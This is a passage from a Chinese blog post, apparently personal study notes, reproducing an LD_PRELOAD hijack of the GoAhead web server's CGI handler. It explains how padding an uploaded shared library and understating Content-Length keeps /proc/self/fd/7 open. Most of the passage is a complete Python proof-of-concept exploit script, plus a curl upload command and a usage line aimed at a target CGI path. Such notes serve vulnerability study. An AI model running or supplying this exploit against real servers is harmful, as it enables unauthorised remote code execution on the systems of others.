</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323001558145.png alt=image-20220323001558145></p><p>查看日志报Too big错误</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#ifndef ME_GOAHEAD_LIMIT_POST
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>#define ME_GOAHEAD_LIMIT_POST 16384
</span></span></span><span style=display:flex><span><span style=color:#75715e>#endif
</span></span></span></code></pre></div><p>最大16384字节，我们在gcc时增加<code>-s</code>参数来减小体积</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -s -shared -fPIC hello.c -o hello.so
</span></span><span style=display:flex><span>$ curl -v -F <span style=color:#111>data</span><span style=color:#f92672>=</span>@hello.so -F <span style=color:#d88200>&#34;LD_PRELOAD=/proc/self/fd/7&#34;</span> <span style=color:#d88200>&#34;http://192.168.31.214:8080/cgi-bin/test&#34;</span>
</span></span></code></pre></div><p>结果报404，fd/n这样的文件描述符对应的内容都无法打开，p牛猜测的可能是：CGI执行到这里时，被打开的临时文件描述符已经关闭，所以无法打开</p><p>照这样的推测，我们可以想到条件竞争，一个上传一个包含，或者是给.so文件后增加脏字符 但是CL头的长度小于最终数据包的大小，这样GoAhead读取数据包的时候能够完全读取到payload.so的内容，但实际这个文件并没有上传完毕</p><p>首先构造好之前那个无法利用的数据包，其中第一个表单字段是<code>LD_PRELOAD</code>，值是文件描述符，一般是<code>/proc/self/fd/7</code>，之后对之前的数据包.so末尾增加几千个字节的脏字符，比如说<code>a</code>，之后将数据包的CL设置为不超过16384的值，但比payload.so文件的大小要大个500字节左右</p><p>由于上传流程没有结束，所以此时文件描述符是没有关闭的，可以通过<code>/proc/self/fd/7</code>读取到，脏字符也不影响动态链接库的加载和运行，最后即可成功完成劫持</p><p>p牛已经写好了脚本</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>socket</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ssl</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>random</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>urllib.parse</span> <span style=color:#f92672>import</span> <span style=color:#111>urlparse</span><span style=color:#111>,</span> <span style=color:#111>ParseResult</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>PAYLOAD_MAX_LENGTH</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>16384</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>exploit</span><span style=color:#111>(</span><span style=color:#111>client</span><span style=color:#111>,</span> <span style=color:#111>parts</span><span style=color:#111>:</span> <span style=color:#111>ParseResult</span><span style=color:#111>,</span> <span style=color:#111>payload</span><span style=color:#111>:</span> <span style=color:#111>bytes</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>path</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;/&#39;</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>path</span> <span style=color:#00a8c8>else</span> <span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>path</span>
</span></span><span style=display:flex><span>    <span style=color:#111>boundary</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;----</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39;</span> <span style=color:#f92672>%</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>randint</span><span style=color:#111>(</span><span style=color:#ae81ff>1000000000000</span><span style=color:#111>,</span> <span style=color:#ae81ff>9999999999999</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>padding</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>2000</span>
</span></span><span style=display:flex><span>    <span style=color:#111>content_length</span> <span style=color:#f92672>=</span> <span style=color:#111>min</span><span style=color:#111>(</span><span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>500</span><span style=color:#111>,</span> <span style=color:#111>PAYLOAD_MAX_LENGTH</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#d88200>fr</span><span style=color:#d88200>&#39;&#39;&#39;POST </span><span style=color:#d88200>{</span><span style=color:#111>path</span><span style=color:#d88200>}</span><span style=color:#d88200> HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: </span><span style=color:#d88200>{</span><span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>hostname</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>Accept-Encoding: gzip, deflate
</span></span></span><span style=display:flex><span><span style=color:#d88200>Accept: */*
</span></span></span><span style=display:flex><span><span style=color:#d88200>Accept-Language: en
</span></span></span><span style=display:flex><span><span style=color:#d88200>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: close
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: multipart/form-data; boundary=</span><span style=color:#d88200>{</span><span style=color:#111>boundary</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Length: </span><span style=color:#d88200>{</span><span style=color:#111>content_length</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>--</span><span style=color:#d88200>{</span><span style=color:#111>boundary</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Disposition: form-data; name=&#34;LD_PRELOAD&#34;;
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>/proc/self/fd/7
</span></span></span><span style=display:flex><span><span style=color:#d88200>--</span><span style=color:#d88200>{</span><span style=color:#111>boundary</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Disposition: form-data; name=&#34;data&#34;; filename=&#34;1.txt&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: text/plain
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>#payload#</span><span style=color:#d88200>{</span><span style=color:#111>padding</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>--</span><span style=color:#d88200>{</span><span style=color:#111>boundary</span><span style=color:#d88200>}</span><span style=color:#d88200>--
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#39;&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>encode</span><span style=color:#111>()</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;#payload#&#39;</span><span style=color:#111>,</span> <span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>client</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>resp</span> <span style=color:#f92672>=</span> <span style=color:#111>client</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>20480</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>main</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>target</span> <span style=color:#f92672>=</span> <span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_filename</span> <span style=color:#f92672>=</span> <span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>2</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>payload_filename</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;rb&#39;</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>f</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>PAYLOAD_MAX_LENGTH</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>raise</span> <span style=color:#75af00>Exception</span><span style=color:#111>(</span><span style=color:#d88200>&#39;payload size must not larger than </span><span style=color:#d88200>%d</span><span style=color:#d88200>&#39;</span><span style=color:#111>,</span> <span style=color:#111>PAYLOAD_MAX_LENGTH</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>parts</span> <span style=color:#f92672>=</span> <span style=color:#111>urlparse</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>port</span> <span style=color:#f92672>=</span> <span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>port</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>port</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>scheme</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;https&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>context</span> <span style=color:#f92672>=</span> <span style=color:#111>ssl</span><span style=color:#f92672>.</span><span style=color:#111>create_default_context</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>create_connection</span><span style=color:#111>((</span><span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>hostname</span><span style=color:#111>,</span> <span style=color:#111>port</span><span style=color:#111>),</span> <span style=color:#111>timeout</span><span style=color:#f92672>=</span><span style=color:#ae81ff>8</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>client</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>scheme</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;https&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>with</span> <span style=color:#111>context</span><span style=color:#f92672>.</span><span style=color:#111>wrap_socket</span><span style=color:#111>(</span><span style=color:#111>client</span><span style=color:#111>,</span> <span style=color:#111>server_hostname</span><span style=color:#f92672>=</span><span style=color:#111>parts</span><span style=color:#f92672>.</span><span style=color:#111>hostname</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>ssock</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>                <span style=color:#111>exploit</span><span style=color:#111>(</span><span style=color:#111>ssock</span><span style=color:#111>,</span> <span style=color:#111>parts</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>exploit</span><span style=color:#111>(</span><span style=color:#111>client</span><span style=color:#111>,</span> <span style=color:#111>parts</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>main</span><span style=color:#111>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323003607010.png alt=image-20220323003607010></p><p>成功劫持</p><p>————由于最近也学习了CL&TE头的相关内容，再看到这里的实现细节感觉还挺亲切的（说明自己学的实在太少了（</p><hr><p>是学习笔记，有很多疏漏还请谅解（</p><p>一直不开学，在家几个月多少有点懈怠，但是时间不等人啊，不要荒废了自己</p></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="Fuc!king life page">Fuc!king life</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 5093 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2022/03/17/maybe-help-someone/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>环境配置&相关问题解决</a>
